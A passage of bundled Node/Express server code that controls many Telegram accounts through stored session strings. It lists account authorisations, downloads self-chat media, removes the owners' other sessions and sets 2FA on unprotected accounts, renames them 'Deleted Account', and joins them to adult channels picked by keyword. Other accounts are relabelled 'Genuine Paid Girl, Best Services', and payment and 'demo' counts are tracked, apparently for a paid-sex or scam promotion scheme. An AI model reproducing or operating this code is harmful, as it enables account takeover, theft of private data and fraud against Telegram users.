    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      await client.blockAllUsers();
      res.send("Blocked Users");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/downloadMedia/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session, false);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      await client.getSelfChatMediaAndZip();
      res.send("Downloading Media");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/getAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      res.json(await client.getAuths());
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});


app.get('/connectcliens/:limit/:skip', async (req, res) => {
  const limit = req.params?.limit;
  const skip = req.params?.skip;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';

  for (const user of users) {
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      if (cli) {
        resp += `${user.mobile} : true\n\n`;
      } else {
        resp += `${user.mobile} : false\n\n`;
      }
    }
  }

  resp += '</pre></body></html>';

  console.log("data: ", resp);
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/disconnectclients', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
});

app.get('/disconnectclient', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const number = req.query?.number?.replace('+', '');
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(number);
});

app.get('/promoteStats', async (req, res, next) => {
  const resp = await getPromotionStatsHtml();
  res.setHeader('Content-Type', 'text/html');
  res.send(resp)
});


app.get('/getusers/:limit/:skip', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const users = await db.getUsers(limit, skip);
  res.json(users)
})

app.get('/getlastmsgs/:number/:limit', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const number = req.params?.number;
  console.log(number, limit);
  const clientobj = (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(number);
  await clientobj.client.connect();
  console.log(clientobj.client.connected);
  if (clientobj) {
    const result = await clientobj?.getLastMsgs(limit, number);
    res.send(result)
  } else {
    res.send("client is undefined");
  }

})

app.get('/getchannels', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getchannels`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/restart', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userName = req.query.userName;
  const checker = checkerclass.getinstance()
  checker.restart(userName.toLowerCase());
});

app.get('/receiveNumber/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const num = parseInt(req.params.num);
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/tgclientoff/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const processId = req.params.num;
    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, " : ", userName, ' - ', processId)

    try {
      const data = userMap.get(userName.toLowerCase());
      const url = data?.url;
      if (url) {
        const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}getprocessid`, { timeout: 10000 });
        if (connectResp.data.ProcessId === processId) {
          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
          pushToconnectionQueue(userName, processId)
        } else {
          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);
          console.log("Request received from Unknown process")
        }
      }
    } catch (error) {
      console.log("Some Error: ", error)
    }

  } catch (error) {
    console.log("Some Error: ", error);
  }
});


app.get('/joinchannel', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    if (userName) {
      const data = userMap.get(userName.toLowerCase());
      if (data) {
        joinchannels(data)
      } else {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
      }
    } else {
      Array.from(userMap.values()).map(async (value) => {
        try {
          joinchannels(value);
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
        } catch (error) {
          console.log("Some Error: ", error.code);
        }
      })
    }
  } catch (error) {
    console.log("Some Error: ", error);
  }
});

app.get('/joinchannelBf', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    joinchannelForBufferClients()
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/requestcall', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const chatId = req.query.chatId;
    const user = userMap.get(userName.toLowerCase());
    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);
    console.log(`Call Request Recived: ${userName} | ${chatId}`)
    if (user) {
      setTimeout(async () => {
        try {
          const data = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
          if (data.data) {
            console.log(`Call Request Sent: ${userName} | ${chatId}`)
            setTimeout(async () => {
              try {
                const data = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
                setTimeout(async () => {
                  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
                }, 3 * 60 * 1000);
              } catch (error) {
                console.log(error)
              }
            }, 2 * 60 * 1000);
          } else {
            console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);
          }
        } catch (error) {
          console.log("Failed", user);
        }

      }, 3 * 60 * 1000);
    } else {
      console.log("USer not exist!!")
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});
const nestApp = await _nestjs_core__WEBPACK_IMPORTED_MODULE_11__.NestFactory.create(commonService__WEBPACK_IMPORTED_MODULE_13__.AppModule, new _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__.ExpressAdapter(app));

const config = new _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.DocumentBuilder()
  .setTitle('NestJS and Express API')
  .setDescription('API documentation')
  .setVersion('1.0')
  .build();
const document = _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.SwaggerModule.createDocument(nestApp, config);
// fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
_nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.SwaggerModule.setup('api', nestApp, document);
mongoose__WEBPACK_IMPORTED_MODULE_15___default().set('debug', true)
await nestApp.init();

app.listen(port, async () => {
  console.log(`Example app listening at http://localhost:${port}`)
});

class checkerclass {
  static instance = undefined;

  constructor() {
    this.main();
  };

  static getinstance() {
    if (!checkerclass.instance) {
      console.log('creating instance-------')
      checkerclass.instance = new checkerclass();
    }
    return checkerclass.instance;
  }
  main() {

  }

  async restart(userName, processId) {
    const data = userMap.get(userName);
    console.log(data, userName);
    const url = data?.url;
    if (url) {
      userMap.set(userName, { ...data, timeStamp: Date.now() });
      try {
        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });
        try {
          console.log('Checking Health')
          const resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url} checkHealth`, { timeout: 10000 });
          if (resp.status === 200 || resp.status === 201) {
            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
              console.log(resp.data.userName, ': All good');
            } else {
              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
              await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=${(resp.data.userName).toUpperCase()}:HealthCheckError-${resp.data.status}`);
              try {
                const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}tryToConnect/${processId}`, { timeout: 10000 });
                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
                await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=${(connectResp.data.userName).toUpperCase()}:RetryResponse-${connectResp.data.status}`);
              } catch (e) {
                console.log(url, `CONNECTION RESTART FAILED!!`);
              }
            }
          } else {
            console.log(url, `is unreachable!!`);
          }
        } catch (e) {
          console.log(url, `is unreachable!!`);
          //console.log(e)
        }
      }
      catch (e) {
        console.log(e)
      }
    }
    else {
      console.log('url is undefined');
    }
  }
}
async function joinchannels(value) {
  try {
    let resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}channelinfo`, { timeout: 200000 });
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${((0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Started Joining Channels- ${value.clientId}`)
      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'coupl', 'cpl', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
      const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
      for (const channel of channels) {
        try {
          console.log(channel.username);
          const username = channel?.username?.replace("@", '');
          if (username) {
            (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}joinchannel?username=${username}`);
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(200000);
          }
        } catch (error) {
          console.log("Some Error: ", error)
        }
      }
    }
  } catch (error) {
    console.log(error)
  }
}


async function getPromotionStatsPlain() {
  let resp = '';
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;
  }
  return resp;
}

async function getPromotionStats() {
  let resp = '';
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;
  }
  return resp;
}

async function getPromotionStatsHtml() {
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  resp = resp + await getPromotionStats();
  resp += '</pre></body></html>';
  return resp;
}

function isDateInPast(dateStr) {
  const today = new Date();
  const [day, month, year] = dateStr.split('-').map(Number);
  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript

  return inputDate < today;
}

async function getData() {
  const profileData = await createInitializedObject();
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  let entries = await db.readStats();
  // console.log(Object.keys(profileData));
  for (const entry of entries) {
    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;

    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])
    if (client && profileData[client.toUpperCase()]) {
      const userData = profileData[client.toUpperCase()];
      userData.totalCount += count;
      userData.totalPaid += payAmount > 0 ? 1 : 0;
      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
      if (payAmount > 25 && !demoGiven) {
        userData.names = userData.names + ` ${name} |`
      }

      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {
        userData.fullShowPPl++;
        userData.fullShowNames = userData.fullShowNames + ` ${name} |`
      }

      if (newUser) {
        userData.totalNew += 1;
        userData.totalNewPaid += payAmount > 0 ? 1 : 0;
        userData.newPaidDemo += demoGivenToday ? 1 : 0;
        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      }
    }
  }
  const profileDataArray = Object.entries(profileData);
  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);
  let reply = '';
  for (const [profile, userData] of profileDataArray) {
    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;
  }

  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);
  let reply2 = '';
  for (const [profile, userData] of profileDataArray) {
    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;
  }

  let reply3 = await getPromotionStats()

  return (
    `<div>
      <div style="display: flex; margin-bottom: 60px">
        <div style="flex: 1;">${reply}</div>
        <div style="flex: 1; ">${reply2}</div>
      </div>
      <div style="display: flex;">
        <div style="flex: 1; " >${reply3}</div>
      </div>
    </div>`
  );

}

let goodIds = [];
let badIds = [];
async function checkBufferClients() {
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)()
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
  const clients = await db.readBufferClients({});
  goodIds = [];
  badIds = [];
  if (clients.length < 40) {
    for (let i = 0; i < 40 - clients.length; i++) {
      badIds.push(1)
    }
  }
  for (const document of clients) {
    console.log(document)
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session);
    if (cli) {
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(document.mobile);
      const hasPassword = await client.hasPassword();
      if (!hasPassword) {
        badIds.push(document.mobile);
        await db.deleteBufferClient(document);
      } else {
        const channels = await client.channelInfo(true);
        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });
        console.log(document.mobile, " :  ALL Good");
        goodIds.push(document.mobile)
      }
      await client.disconnect();
      await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(document.mobile)
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
    } else {
      console.log(document.mobile, " :  false");
      badIds.push(document.mobile);
      await db.deleteBufferClient(document)
    }
  }
  console.log(badIds, goodIds);
  await addNewUserstoBufferClients();
}

async function addNewUserstoBufferClients() {
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const cursor = await db.getNewBufferClients(goodIds);
  while (badIds.length > 0) {
    try {
      if (cursor.hasNext()) {
        const document = await cursor.next();
        const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session);
        if (cli) {
          const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(document.mobile);
          const hasPassword = await client.hasPassword();
          console.log("hasPassword: ", hasPassword);
          if (!hasPassword) {
            await client.removeOtherAuths();
            await client.set2fa();
            console.log("waiting for setting 2FA");
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(35000);
            await client.updateUsername();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
            await client.updatePrivacyforDeletedAccount();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
            await client.updateProfile("Deleted Account", "Deleted Account");
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
            await client.deleteProfilePhotos();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
            console.log("Inserting Document");
            document['date'] = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
            await db.insertInBufferClients(document);
            await client.disconnect();
            await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(document.mobile)
            badIds.pop();
          } else {
            await db.updateUser(document, { twoFA: true });
            await client.disconnect();
            await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(document.mobile)
          }
        } else {
          // await db.deleteUser(document);
        }
      } else {
        console.log("Cursor Does not have Next");
      }
    } catch (error) {
      console.error("An error occurred:", error);
    }
  }
  setTimeout(() => {
    joinchannelForBufferClients()
  }, 2 * 60 * 1000);
}

async function checkArchivedClients() {
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)()
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
  const clients = await db.readArchivedClients({});
  for (const document of clients) {
    console.log(document)
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session);
    if (!cli) {
      console.log(document.mobile, " :  false");
      badIds.push(document.mobile);
      await db.removeOneAchivedClient({ number: document.number })
    }
  }
}


async function updateClient(clientId) {
  try {
    const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
    const oldClient = await db.getUserConfig({ clientId })
    if (oldClient) {
      try {
        const oldClientUser = await db.getUser({ mobile: (oldClient?.mobile.toString()).replace("+", '') });
        if (oldClientUser) {
          const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(oldClientUser?.mobile, oldClientUser?.session);
          if (cli) {
            const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(oldClientUser.mobile);
            await _cloudinary__WEBPACK_IMPORTED_MODULE_9__.CloudinaryService.getInstance(oldClient?.dbcoll?.toLowerCase());
            // const userCaps = username[0].toUpperCase() + username.slice(1)
            // await client.updateUsername(`${userCaps}Redd`);
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000)
            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
            await client.deleteProfilePhotos();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
            await client.updatePrivacy();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
            await client.updateProfilePic(path__WEBPACK_IMPORTED_MODULE_16___default().join(__dirname + '../dp1.jpg'));
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
            await client.updateProfilePic(path__WEBPACK_IMPORTED_MODULE_16___default().join(__dirname + '../dp2.jpg'));
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
            await client.updateProfilePic(path__WEBPACK_IMPORTED_MODULE_16___default().join(__dirname + '../dp3.jpg'));
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
            await client.disconnect(oldClientUser.mobile)
          }
        }
      } catch (error) {
        console.log("Error updateing settings of old Client - ", error);
      }
    }
  } catch (e) {

  }
}
async function setUpClient(clientId, archieveOld, days = 0, mobile = null, formalities = true, pLimited = false) {
  try {
    const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const oldClient = await db.getUserConfig({ clientId })
    let oldClienttg;
    if (archieveOld && oldClient) {
      try {
        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
        if (oldClientUser) {
          const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(oldClientUser?.mobile, oldClientUser?.session, false);
          if (cli) {
            oldClienttg = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(oldClientUser.mobile);
            // await oldClienttg.updateProfile("Deleted Account", `New ACC https://${oldClient.link}`);
            // await sleep(5000)
            await oldClienttg.deleteProfilePhotos();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
            await oldClienttg.updatePrivacyforDeletedAccount();
            await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000)
            await oldClienttg.updateUsername()
          }
        }
        delete oldClientUser["_id"];
        if (!pLimited) {
          oldClientUser['date'] = (new Date(Date.now() + (days * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
          await db.insertInBufferClients({ ...oldClientUser })
        }
      } catch (error) {
        console.log("Error updateing settings of old Client - ", error);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Error updateing settings of old Client - ${clientId}`);
      }
      delete oldClient['_id']
      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]
      oldClient['pLimited'] = pLimited
      await db.insertInAchivedClient(oldClient);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Archived Old Client ${clientId}`);
      console.log("Archived old client");
    }

    const newClient = await db.getOneBufferClient(mobile);

    await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(newClient?.mobile)
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
    if (newClient) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(newClient.mobile, newClient.session, false);
      if (cli) {
        const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(newClient.mobile);
        let newUsername
        ;(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.setActiveClientSetup)({ phoneNumber: newClient.mobile, clientId });
        if (formalities) {
          const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
          const userCaps = username[0].toUpperCase() + username.slice(1);
          newUsername = await client.updateUsername(`${userCaps}Redd`);
          if (archieveOld && oldClienttg) {
            oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
          }
        }
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000)
        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });
        if (existingData) {
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Setting UP from archives - ${clientId}-${newUsername}-${newClient.mobile}`);
          console.log("Data Existing already");
          await setNewClient({ ...existingData, userName: newUsername }, { clientId });
          await db.removeOneAchivedClient({ number: `+${newClient.mobile}` });
        } else {
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Generating new Session -  ${clientId}-${newUsername}-${newClient.mobile}`);
          await generateNewSession(newClient.mobile);
          setTimeout(async () => {
            const stillExists = await db.getOneBufferClient(newClient.mobile);
            if (stillExists) {
              console.log("Removeing buff client as failed to update")
              stillExists['date'] = (new Date(Date.now() + (30 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
              await db.insertInBufferClients({ ...stillExists })
            }
          }, 150000);
        }
      }
    } else {
      console.log("New client does not exist")
    }
  } catch (error) {
    console.log(error)
  }
}
async function generateNewSession(phoneNumber) {
  try {
    console.log("String Generation started");
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
    const response = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`https://tgsignup.onrender.com/login?phone=${phoneNumber.toString()}&force=${true}`, { timeout: 15000 }, 1);
    if (response) {
      console.log(`Code Sent successfully`, response);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
    } else {
      console.log(`Failed to send Code-${JSON.stringify(response)}`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000);
      await generateNewSession(phoneNumber);
    }
  } catch (error) {
    console.log(error)
  }
}
async function setNewClient(user, activeClientSetup) {
  try {
    console.log("Setting data for:", user, activeClientSetup)
    const clientId = activeClientSetup.clientId;
    const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    let mainAccount = user.userName?.replace("@", '')
    if ((0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchNumbersFromString)(clientId) == "2") {
      const mainUser = await db.getUserConfig({ clientId: clientId.replace("2", "1") });
      mainAccount = mainUser.userName;
    } else {
      const client2 = clientId.replace("1", "2")
      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });
      if (data) {
        console.log(client2, " -  ", data)
        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
        // if (data.userName) {
        //   try {
        //     await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${data.userName}`);
        //   } catch (error) {

        //   }
        // }
      }
    }
    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
    console.log("Updated the Client Successfully", activeClientSetup.phoneNumber, updatedClient);
    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/forward/updateclient/${clientId}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
    console.log(activeClientSetup.clientId, " -  ", updatedClient)
    if (updatedClient?.userName) {
      try {
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/disconnectUser?userName=${updatedClient.userName}`);
      } catch (error) {
        console.log(error);
      }
    }
    await setUserMap();
    try {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`);
    } catch (error) {
      console.log(error);
    }
  } catch (error) {
    console.log(error);;
  }
}


async function joinchannelForBufferClients() {
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
  const clients = await db.readBufferClients({ channels: { "$lt": 180 } }, 4)
  for (const document of clients) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session, false);
    if (cli) {
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(document.mobile);
      const channels = await client.channelInfo(true);
